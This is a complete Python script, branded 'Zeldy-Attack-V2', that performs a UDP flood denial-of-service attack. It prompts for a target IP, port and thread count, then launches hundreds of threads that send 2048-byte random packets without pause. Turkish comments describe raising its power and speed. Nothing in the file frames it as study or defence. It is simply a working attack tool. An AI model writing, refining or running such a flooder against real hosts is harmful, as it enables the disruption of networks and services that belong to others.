#!/usr/bin/python3
import os
import time
import sys
import socket
import threading
import platform
import random

try:
   from colorama import Fore, init
   init()
except ImportError:
    os.system("pip3 install colorama")

system = platform.uname()[0]

# ===== SPACE PALETTE =====
palette = [
    27,27,27,33,33,39,39,45,45,51,51,57,57,63,63,
    69,75,81,87,93,99,105,111,117,123,
    129,135,141,147,153,159,165,171,177
]

def gradient_block(text):
    total_chars = len(text)
    index = 0
    colored = ""
    for ch in text:
        if ch == "\n":
            colored += "\n"
            continue
        color_code = palette[int(index/total_chars*(len(palette)-1))]
        colored += f"\033[38;5;{color_code}m{ch}"
        index += 1
    return colored + "\033[0m"

def title():
    if system == 'Linux' or 'Android' in platform.platform():
      os.system("printf '\033]2;Zeldy-Attack-V2\a'")
    elif system == 'Windows':
        os.system("title Zeldy-Attack-V2")

def cls():
    if system == 'Windows':
      os.system("cls")
    else:
        os.system("clear")

class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'

def menu():
    title()
    cls()
    
    logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..     
       .@^  YUU[[[/o@^;::---..      
     oMP     ^/o@P^;:::---..       
  .dMMM    .o@^ ^;::---...         
 dMMMMMMM@^`       `^^^^           
YMMMUP^

          Zeldy High Power Attack
          Status: Turbo Mode ON
"""
    print(gradient_block(logo))
    
    try:
        host = input("\nEnter İp: ")
        port = int(input("\nEnter Target port: "))
        # Gücü buradan ayarlıyoruz (Thread sayısı)
        threads = int(input("\nEnter Thread (Recom: 500-1000): "))
        
        # Paket boyutunu büyüttük (1490 -> 2048)
        bs = random._urandom(2048)
        cls()
        
        ip = socket.gethostbyname(host)
        print(f"{color.red}Target: {ip} | Port: {port} | Threads: {threads}{color.End}")
        print(f"{color.green}Attack Started...{color.End}")
        
        # Soketi bir kez tanımlayıp her thread'de kullanıyoruz (Hız için)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        def run():
            while True:
                try:
                    # Zaman aşımı ve bekleme yok, sürekli gönderim
                    sock.sendto(bs, (ip, port))
                except:
                    pass
                
        # Belirlediğin thread sayısı kadar döngü
        for i in range(threads):
            ch = threading.Thread(target=run)
            ch.daemon = True
            ch.start()
            
        # Ana thread'i canlı tut ama ekranı çok yormasın diye print'i azalttık
        while True:
            print(f"{Fore.GREEN}[+] Sending High Speed Packets to {Fore.RED}{ip}{Fore.WHITE}", end="\r")
            time.sleep(0.1)

    except Exception as e:
        print(f"\nHata: {e}")
        sys.exit()

if __name__ == '__main__':
    try:
        menu()
    except (EOFError, KeyboardInterrupt):
        print("\nExiting...")
        sys.exit()
      
